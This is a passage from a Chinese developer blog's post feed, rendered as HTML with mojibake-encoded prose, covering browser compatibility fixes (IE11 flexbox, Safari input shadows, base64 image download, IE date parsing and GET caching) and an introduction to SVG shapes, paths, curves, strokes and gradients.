class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"main"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"item"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"item"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"item"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">*&#123;</span></span><br><span class="line"><span class="undefined">  box-sizing: border-box;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-class">.main</span>&#123;</span></span><br><span class="line"><span class="undefined">  display: flex;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-class">.item</span>&#123;</span></span><br><span class="line"><span class="css">  <span class="selector-tag">flex</span>: 0 0 33<span class="selector-class">.3</span>%;</span></span><br><span class="line"><span class="undefined">  padding: 10px;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨Chrome, firefoxä¸Šä¼šæŒ¤åœ¨ä¸€è¡Œé‡Œï¼Œæ¯ä¸ª<code>item</code>ä¹‹é—´æœ‰20pxçš„é—´è·ã€‚ä½†åœ¨IE11ä¸‹ï¼Œ<code>flex-basis</code>è®¾ç½®çš„æ˜¯å…·ä½“çš„å®½åº¦ï¼Œå®ƒä¼šæ— è§†æˆ‘ä»¬è®¾ç½®çš„<code>box-sizing: border-box;</code>ï¼Œè¿™æ—¶ï¼Œæœ€åä¸€ä¸ªå…ƒç´ ä¼šæº¢å‡ºå®¹å™¨ï¼Œæ˜¾ç¤ºä¸ºä¸¤è¡Œã€‚<em>è§£å†³æ–¹æ³•:</em><br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"main"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"item"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"item"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"item"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">*&#123;</span></span><br><span class="line"><span class="undefined">  box-sizing: border-box;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-class">.main</span>&#123;</span></span><br><span class="line"><span class="undefined">  display: flex;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-class">.item</span>&#123;</span></span><br><span class="line"><span class="css">  <span class="selector-tag">flex</span>: 0 0 33<span class="selector-class">.3</span>%;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-class">.item</span> &gt; <span class="selector-tag">div</span>&#123;</span></span><br><span class="line"><span class="undefined">  margin: 0 10px;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="11-å»é™¤Safari-input-textareaé˜´å½±"><a href="#11-å»é™¤Safari-input-textareaé˜´å½±" class="headerlink" title="11. å»é™¤Safari input textareaé˜´å½±"></a>11. å»é™¤Safari input textareaé˜´å½±</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span>, <span class="selector-tag">textarea</span>&#123;</span><br><span class="line">  <span class="attribute">-webkit-appearance</span>: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="12-å¯æ»šåŠ¨-lt-div-gt-ä¸­padding-bottomæ— æ•ˆ"><a href="#12-å¯æ»šåŠ¨-lt-div-gt-ä¸­padding-bottomæ— æ•ˆ" class="headerlink" title="12. å¯æ»šåŠ¨&lt;div&gt;ä¸­padding-bottomæ— æ•ˆ"></a>12. å¯æ»šåŠ¨<code>&lt;div&gt;</code>ä¸­padding-bottomæ— æ•ˆ</h4><p>ç»™é‡Œé¢çš„å…ƒç´ æ·»åŠ <code>padding</code>å€¼</p><p><br></p><h4 id="13-jså®ç°base64å›¾ç‰‡ä¸‹è½½"><a href="#13-jså®ç°base64å›¾ç‰‡ä¸‹è½½" class="headerlink" title="13. jså®ç°base64å›¾ç‰‡ä¸‹è½½"></a>13. jså®ç°base64å›¾ç‰‡ä¸‹è½½</h4><p>åœ¨IE11ä¸­ï¼Œä¼šæŠ¥é”™â€œä¼ é€’ç»™ç³»ç»Ÿè°ƒç”¨çš„æ•°æ®åŒºåŸŸå¤ªå°â€ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> imgUrl = <span class="string">'data:image/png;base64,...'</span></span><br><span class="line"><span class="comment">// IEä¸­ä½¿ç”¨msSaveOrOpenBlobæ–¹æ³•ï¼ˆ</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.navigator.msSaveOrOpenBlob) &#123;</span><br><span class="line">  <span class="keyword">var</span> bstr = atob(imgUrl.split(<span class="string">','</span>)[<span class="number">1</span>])</span><br><span class="line">  <span class="keyword">var</span> n = bstr.length</span><br><span class="line">  <span class="keyword">var</span> u8arr = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(n)</span><br><span class="line">  <span class="keyword">while</span> (n--) &#123;</span><br><span class="line">    u8arr[n] = bstr.charCodeAt(n)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> blob = <span class="keyword">new</span> Blob([u8arr])</span><br><span class="line">  <span class="built_in">window</span>.navigator.msSaveOrOpenBlob(blob, <span class="string">'chart-download'</span> + <span class="string">'.'</span> + <span class="string">'png'</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// åˆ›å»ºaæ ‡ç­¾ï¼Œè§¦å‘ç‚¹å‡»</span></span><br><span class="line">  <span class="keyword">const</span> a = <span class="built_in">document</span>.createElement(<span class="string">'a'</span>)</span><br><span class="line">  a.href = imgUrl</span><br><span class="line">  a.setAttribute(<span class="string">'download'</span>, <span class="string">'chart-download'</span>)</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(a)  <span class="comment">// å…¼å®¹firefoxï¼Œfirefoxä¸èƒ½ä¸‹è½½è·¨åŸŸèµ„æº</span></span><br><span class="line">  a.click()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="14-IE-new-Date-å‡ºç°NaN"><a href="#14-IE-new-Date-å‡ºç°NaN" class="headerlink" title="14. IE new Date()å‡ºç°NaN"></a>14. IE new Date()å‡ºç°NaN</h4><p><code>new Date(&quot;2014-01-01 12:11:12&quot;).getTime()</code>åœ¨IEä¸‹ä¼šè¿”å›NaNï¼Œè€Œå…¶ä»–æµè§ˆå™¨å¯ä»¥è¿”å›æ­£å¸¸æ¯«ç§’æ•°ã€‚ä½¿ç”¨<code>Date.parse()</code>å¯è§£æä¸€ä¸ªæ—¥æœŸæ—¶é—´å­—ç¬¦ä¸²ï¼Œå¹¶è¿”å›æ¯«ç§’æ•°ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> date=<span class="string">"2014-01-01 12:11:12"</span>;  </span><br><span class="line"><span class="built_in">Date</span>.parse(date.replace(<span class="regexp">/-/g</span>,<span class="string">"/"</span>));</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="15-IE-11-ç¼“å­˜getè¯·æ±‚"><a href="#15-IE-11-ç¼“å­˜getè¯·æ±‚" class="headerlink" title="15. IE 11 ç¼“å­˜getè¯·æ±‚"></a>15. IE 11 ç¼“å­˜getè¯·æ±‚</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆ¤æ–­getè¯·æ±‚æ—¶ï¼Œè¿½åŠ è¯·æ±‚å‚æ•°</span></span><br><span class="line"><span class="keyword">const</span> isIE = !!<span class="built_in">window</span>.ActiveXObject || <span class="string">'ActiveXObject'</span> <span class="keyword">in</span> <span class="built_in">window</span>; <span class="comment">// åˆ¤æ–­æ˜¯å¦IEæµè§ˆå™¨</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isIE) &#123;</span><br><span class="line">  params = &#123; ...params, <span class="attr">t</span>: <span class="keyword">new</span> <span class="built_in">Date</span>().getTime() &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="16-ä½¿ç”¨äº†text-overflow-ellipsis"><a href="#16-ä½¿ç”¨äº†text-overflow-ellipsis" class="headerlink" title="16. ä½¿ç”¨äº†text-overflow: ellipsis"></a>16. ä½¿ç”¨äº†text-overflow: ellipsis</h4><p>element UI table çš„ <code>show-overflow-tooltip</code>å½“éšè—çš„å­—æ®µä¸ºä¸¤ä¸ªå­—ç¬¦é•¿åº¦æ—¶ï¼Œå­—æ®µè¶…å‡ºéšè—äº†ï¼Œä½†æ˜¯hoveræ— æ³•æ˜¾ç¤ºtooltipã€‚scrollWidthå’ŒoffsetWidthï¼Œåœ¨chrome, firefox, ieä¸­è¡¨ç°ä¸ä¸€æ ·ã€‚<br><a href="https://github.com/ElemeFE/element/issues/18065" target="_blank" rel="noopener">https://github.com/ElemeFE/element/issues/18065</a><br><a href="https://github.com/ElemeFE/element/issues/5049" target="_blank" rel="noopener">https://github.com/ElemeFE/element/issues/5049</a></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://www.cnblogs.com/dodocie/p/7137314.html" target="_blank" rel="noopener">Flex å¸ƒå±€åœ¨IEæµè§ˆå™¨ä¸‹çš„ç³Ÿç³•è¡¨ç°</a></li><li><a href="https://blog.csdn.net/kimbing/article/details/52876953" target="_blank" rel="noopener">Safariä¸­input textareaå»é™¤é˜´å½±</a></li><li><a href="https://www.jb51.net/article/147431.htm" target="_blank" rel="noopener">çº¯javascriptå‰ç«¯å®ç°base64å›¾ç‰‡ä¸‹è½½(å…¼å®¹IE10+)</a></li></ul>]]></content>
      
      <categories>
          
          <category> Browser </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>SVGæ–‡æ¡£</title>
      <link href="/2018/11/06/SVG%E6%96%87%E6%A1%A3/"/>
      <url>/2018/11/06/SVG%E6%96%87%E6%A1%A3/</url>
      <content type="html"><![CDATA[<p>SVGæ–‡æ¡£ç”±<code>&lt;svg&gt;</code>æ ¹å…ƒç´ å’ŒåŸºæœ¬å½¢çŠ¶å…ƒç´ (ç”¨äºå®šä¹‰åœ†å½¢ã€çŸ©å½¢ã€ç®€å•æˆ–å¤æ‚çš„æ›²çº¿)æ„æˆã€‚è¿˜æœ‰ä¸€ä¸ª<code>&lt;g&gt;</code>å…ƒç´ ï¼Œç”¨æ¥æŠŠè‹¥å¹²åŸºæœ¬å½¢çŠ¶ç¼–æˆä¸€ä¸ªç»„ã€‚SVGæ”¯æŒæ¸å˜ã€æ—‹è½¬ã€æ»¤é•œæ•ˆæœã€JSæ¥å£ç­‰åŠŸèƒ½ã€‚<br><br></p><h3 id="1-åŸºæœ¬å±æ€§"><a href="#1-åŸºæœ¬å±æ€§" class="headerlink" title="1. åŸºæœ¬å±æ€§"></a>1. åŸºæœ¬å±æ€§</h3><ul><li><code>version å’Œ baseProfile</code> : ç”¨äºç¡®å®šSVGç‰ˆæœ¬,æ˜¯å¿…ä¸å¯å°‘çš„ã€‚</li><li><code>&lt;object&gt;</code> : å¯ä»¥é€šè¿‡è¯¥å…ƒç´ å¼•ç”¨SVGæ–‡ä»¶</li><li><code>viewBox</code>: å®šä¹‰ç”»å¸ƒä¸Šå¯ä»¥æ˜¾ç¤ºçš„åŒºåŸŸï¼Œä»(0, 0)ç‚¹å¼€å§‹ï¼Œ 100å®½*100é«˜çš„åŒºåŸŸã€‚è¿™100çš„åŒºåŸŸï¼Œä¼šæ”¾åˆ°200*200çš„ç”»å¸ƒä¸Šæ˜¾ç¤ºï¼Œå½¢æˆäº†æ”¾å¤§ä¸¤å€çš„æ•ˆæœã€‚</li><li>SVGé‡Œçš„å±æ€§å€¼å¿…é¡»ç”¨å¼•å·å¼•èµ·æ¥<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg version=&quot;1.1&quot;</span><br><span class="line">     baseProfile=&quot;full&quot;</span><br><span class="line">     width=&quot;300&quot; height=&quot;200&quot;</span><br><span class="line">     viewBox=&quot;0 0 100 100&quot;</span><br><span class="line">     xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;</span><br><span class="line">&lt;/svg&gt;</span><br><span class="line">&lt;object data=&quot;image.svg&quot; type=&quot;image/svg+xml&quot; /&gt;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="2-åŸºæœ¬å½¢çŠ¶"><a href="#2-åŸºæœ¬å½¢çŠ¶" class="headerlink" title="2. åŸºæœ¬å½¢çŠ¶"></a>2. åŸºæœ¬å½¢çŠ¶</h3><ul><li><p>çŸ©å½¢<br>(x,y) çŸ©å½¢å·¦ä¸Šè§’çš„ä½ç½®ï¼Œ width heightå®½é«˜ï¼Œ rx ryåœ†è§’çš„åŠå¾„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;rect x=&quot;10&quot; y=&quot;10&quot; width=&quot;30&quot; height=&quot;30&quot; rx=&quot;10&quot; ry=&quot;10&quot; /&gt;</span><br></pre></td></tr></table></figure></li><li><p>åœ†å½¢<br>(cx, cy) åœ†å¿ƒçš„ä½ç½®ï¼Œ r åœ†çš„åŠå¾„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;circle cx=&quot;25&quot; cy=&quot;75&quot; r=&quot;20&quot; /&gt;</span><br></pre></td></tr></table></figure></li><li><p>æ¤­åœ†<br>(cx, cy) æ¤­åœ†ä¸­å¿ƒçš„ä½ç½®, rx ry æ¤­åœ†çš„x,yåŠå¾„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ellipse cx=&quot;75&quot; cy=&quot;75&quot; rx=&quot;20&quot; ry=&quot;5&quot; /&gt;</span><br></pre></td></tr></table></figure></li><li><p>ç›´çº¿<br>(x1, y1) èµ·ç‚¹çš„ä½ç½®ï¼Œ (x2, y2) ç»ˆç‚¹çš„ä½ç½®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;line x1=&quot;10&quot; x2=&quot;50&quot; y1=&quot;110&quot; y2=&quot;150&quot; /&gt;</span><br></pre></td></tr></table></figure></li><li><p>æŠ˜çº¿<br>points=â€x1 y1, x2 y2, x3 y3â€ ç‚¹é›†æ•°åˆ—</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;polyline points=&quot;60 110, 65 120, 70 115, 75 130, 80 125, 85 140, 90 135, 95 150, 100 145&quot; /&gt;</span><br></pre></td></tr></table></figure></li><li><p>å¤šè¾¹å½¢<br>points=â€x1 y1, x2 y2, x3 y3â€ ç‚¹é›†æ•°åˆ—ï¼Œè·¯å¾„æœ€åä¸€ä¸ªç‚¹è‡ªåŠ¨å›åˆ°ç¬¬ä¸€ä¸ªç‚¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;polygon points=&quot;50 160, 55 180, 70 180, 60 190, 65 205, 50 195, 35 205, 40 190, 30 180, 45 180&quot; /&gt;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="3-è·¯å¾„"><a href="#3-è·¯å¾„" class="headerlink" title="3. è·¯å¾„"></a>3. è·¯å¾„</h3><p><em>d</em>: å‘½ä»¤+å‚æ•°çš„åºåˆ—ï¼Œå…³äºå¦‚ä½•ç»˜åˆ¶è·¯å¾„çš„ä¿¡æ¯ã€‚<strong>å‘½ä»¤æ–¹å¼</strong> : ä¸€ç§ç”¨å¤§å†™å­—æ¯ï¼Œè¡¨ç¤ºé‡‡ç”¨ç»å¯¹å®šä½ã€‚å¦ä¸€ç§ç”¨å°å†™å­—æ¯ï¼Œè¡¨ç¤ºé‡‡ç”¨ç›¸å¯¹å®šä½ã€‚</p><h4 id="3-1-ç›´çº¿å‘½ä»¤"><a href="#3-1-ç›´çº¿å‘½ä»¤" class="headerlink" title="3.1 ç›´çº¿å‘½ä»¤"></a>3.1 ç›´çº¿å‘½ä»¤</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;path d=&quot;M10 10 H 90 V 90 H 10 Z&quot; fill=&quot;transparent&quot; stroke=&quot;black&quot;/&gt;</span><br><span class="line">// M x y  : move to ç§»åŠ¨ç”»ç¬”</span><br><span class="line">// L x y  : line to ç”»ä¸€æ¡çº¿æ®µ</span><br><span class="line">// H x    : ç®€å†™å‘½ä»¤ï¼Œç»˜åˆ¶å¹³è¡Œçº¿</span><br><span class="line">// V y    : ç®€å†™å‘½ä»¤ï¼Œç»˜åˆ¶å‚ç›´çº¿ </span><br><span class="line">// Z      : é—­åˆè·¯å¾„</span><br></pre></td></tr></table></figure><h4 id="3-2-æ›²çº¿å‘½ä»¤"><a href="#3-2-æ›²çº¿å‘½ä»¤" class="headerlink" title="3.2 æ›²çº¿å‘½ä»¤"></a>3.2 æ›²çº¿å‘½ä»¤</h4><h5 id="3-2-1-ä¸‰æ¬¡è´å¡å°”æ›²çº¿"><a href="#3-2-1-ä¸‰æ¬¡è´å¡å°”æ›²çº¿" class="headerlink" title="3.2.1 ä¸‰æ¬¡è´å¡å°”æ›²çº¿"></a>3.2.1 ä¸‰æ¬¡è´å¡å°”æ›²çº¿</h5><p>å¦‚æœSå‘½ä»¤è·Ÿåœ¨ä¸€ä¸ªCå‘½ä»¤æˆ–è€…å¦ä¸€ä¸ªSå‘½ä»¤çš„åé¢ï¼Œå®ƒçš„ç¬¬ä¸€ä¸ªæ§åˆ¶ç‚¹ï¼Œå°±ä¼šè¢«å‡è®¾æˆå‰ä¸€ä¸ªæ§åˆ¶ç‚¹çš„å¯¹ç§°ç‚¹ã€‚å¦‚æœSå‘½ä»¤å•ç‹¬ä½¿ç”¨ï¼Œå‰é¢æ²¡æœ‰Cå‘½ä»¤æˆ–è€…å¦ä¸€ä¸ªSå‘½ä»¤ï¼Œé‚£ä¹ˆå®ƒçš„ä¸¤ä¸ªæ§åˆ¶ç‚¹å°±ä¼šè¢«å‡è®¾ä¸ºåŒä¸€ä¸ªç‚¹ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;path d=&quot;M10 10 C 20 20, 40 20, 50 10&quot; stroke=&quot;black&quot; fill=&quot;transparent&quot;/&gt;</span><br><span class="line">// C x1 y1, x2 y2, x y | (x1,y1)èµ·ç‚¹çš„æ§åˆ¶ç‚¹ï¼Œ (x2,y2)ç»ˆç‚¹çš„æ§åˆ¶ç‚¹ï¼Œ (x,y)æ›²çº¿çš„ç»ˆç‚¹</span><br><span class="line">// S x2 y2, x y        | ç®€å†™</span><br></pre></td></tr></table></figure></p><p><img src="/2018/11/06/SVGæ–‡æ¡£/1.png" style="max-width: 380px"></p><p><br><br><br></p><h5 id="3-2-2-äºŒæ¬¡è´å¡å°”æ›²çº¿"><a href="#3-2-2-äºŒæ¬¡è´å¡å°”æ›²çº¿" class="headerlink" title="3.2.2 äºŒæ¬¡è´å¡å°”æ›²çº¿"></a>3.2.2 äºŒæ¬¡è´å¡å°”æ›²çº¿</h5><p>Tå‘½ä»¤å‰é¢å¿…é¡»æ˜¯ä¸€ä¸ªQå‘½ä»¤ï¼Œæˆ–è€…æ˜¯å¦ä¸€ä¸ªTå‘½ä»¤ï¼Œæ§åˆ¶ç‚¹ä¸ºå‰ä¸€ä¸ªæ§åˆ¶ç‚¹çš„å¯¹ç§°ç‚¹ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// Q x1 y1, x y        | (x1,y1)æ§åˆ¶ç‚¹ï¼Œ (x,y)ç»ˆç‚¹</span><br><span class="line">// T x  y              | ç®€å†™</span><br></pre></td></tr></table></figure></p><p><img src="/2018/11/06/SVGæ–‡æ¡£/2.png" style="max-width: 380px"></p><p><br><br><br></p><h5 id="3-2-3-å¼§å½¢"><a href="#3-2-3-å¼§å½¢" class="headerlink" title="3.2.3 å¼§å½¢"></a>3.2.3 å¼§å½¢</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// A rx ry x-axis-rotation large-arc-flag sweep-flag x y</span><br><span class="line">// A xè½´åŠå¾„ yè½´åŠå¾„ xè½´æ—‹è½¬è§’åº¦ è§’åº¦å¤§å° å¼§çº¿æ–¹å‘ å¼§å½¢çš„ç»ˆç‚¹(x,y) </span><br><span class="line">// a rx ry x-axis-rotation large-arc-flag sweep-flag dx dy</span><br><span class="line">&lt;svg width=&quot;325px&quot; height=&quot;325px&quot; version=&quot;1.1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;</span><br><span class="line">  &lt;path d=&quot;M80 80</span><br><span class="line">           A 45 45, 0, 0, 0, 125 125</span><br><span class="line">           L 125 80 Z&quot; fill=&quot;green&quot;/&gt;</span><br><span class="line">  &lt;path d=&quot;M230 80</span><br><span class="line">           A 45 45, 0, 1, 0, 275 125</span><br><span class="line">           L 275 80 Z&quot; fill=&quot;red&quot;/&gt;</span><br><span class="line">  &lt;path d=&quot;M80 230</span><br><span class="line">           A 45 45, 0, 0, 1, 125 275</span><br><span class="line">           L 125 230 Z&quot; fill=&quot;purple&quot;/&gt;</span><br><span class="line">  &lt;path d=&quot;M230 230</span><br><span class="line">           A 45 45, 0, 1, 1, 275 275</span><br><span class="line">           L 275 230 Z&quot; fill=&quot;blue&quot;/&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure><p><img src="/2018/11/06/SVGæ–‡æ¡£/3.png" style="max-width: 380px"><br><br></p><h3 id="4-å¡«å……ä¸è¾¹æ¡†"><a href="#4-å¡«å……ä¸è¾¹æ¡†" class="headerlink" title="4. å¡«å……ä¸è¾¹æ¡†"></a>4. å¡«å……ä¸è¾¹æ¡†</h3><ul><li><p>ä¸Šè‰² : stroke, fill, stroke-opacity, fill-opacity</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;rect x=&quot;10&quot; y=&quot;10&quot; width=&quot;100&quot; height=&quot;100&quot; stroke=&quot;blue&quot; fill=&quot;purple&quot;</span><br><span class="line">      fill-opacity=&quot;0.5&quot; stroke-opacity=&quot;0.8&quot;/&gt;</span><br><span class="line"></span><br><span class="line">// ä½¿ç”¨CSSè®¾ç½®fillå’Œstroke</span><br><span class="line">&lt;rect x=&quot;10&quot; height=&quot;180&quot; y=&quot;10&quot; width=&quot;180&quot; style=&quot;stroke: black; fill: red;&quot;/&gt;</span><br></pre></td></tr></table></figure></li><li><p>æè¾¹ : stroke-width, stroke-linecap = â€œbutt/square/roundâ€, stroke-linejoin = â€œmiter/round/bevelâ€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;polyline points=&quot;40 60 80 20 120 60&quot; stroke=&quot;black&quot; stroke-width=&quot;20&quot;</span><br><span class="line">      stroke-linecap=&quot;butt&quot; fill=&quot;none&quot; stroke-linejoin=&quot;miter&quot;/&gt;</span><br></pre></td></tr></table></figure></li><li><p>è™šçº¿ : stroke-dasharray æ•°åˆ—ç”¨æ¥æè¿°è™šçº¿</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;path d=&quot;M 10 75 Q 50 10 100 75 T 190 75&quot; stroke=&quot;black&quot;</span><br><span class="line">    stroke-linecap=&quot;round&quot; stroke-dasharray=&quot;5,10,5&quot; fill=&quot;none&quot;/&gt;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="5-æ¸å˜ä¸å›¾æ¡ˆ"><a href="#5-æ¸å˜ä¸å›¾æ¡ˆ" class="headerlink" title="5. æ¸å˜ä¸å›¾æ¡ˆ"></a>5. æ¸å˜ä¸å›¾æ¡ˆ</h3><ul><li><p>çº¿æ€§æ¸å˜<br>åœ¨SVGæ–‡ä»¶çš„<code>&lt;defs&gt;</code>å…ƒç´ å†…éƒ¨ï¼Œåˆ›å»ºä¸€ä¸ª<code>&lt;linearGradient&gt;</code>èŠ‚ç‚¹ã€‚<code>&lt;linearGradient&gt;</code>ä¸­çš„(x1,y1) (x2,y2) å®šä¹‰äº†æ¸å˜è·¯çº¿èµ°å‘ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg width=&quot;100&quot; height=&quot;100&quot; version=&quot;1.1&quot; xmlns=&quot;https://www.w3.org/2000/svg&quot;&gt;</span><br><span class="line">  &lt;defs&gt;</span><br><span class="line">      &lt;linearGradient id=&quot;Gradient1&quot; x1=&quot;0&quot; x2=&quot;0&quot; y1=&quot;0&quot; y2=&quot;1&quot;&gt;</span><br><span class="line">         &lt;stop offset=&quot;0%&quot; stop-color=&quot;red&quot; /&gt;</span><br><span class="line">         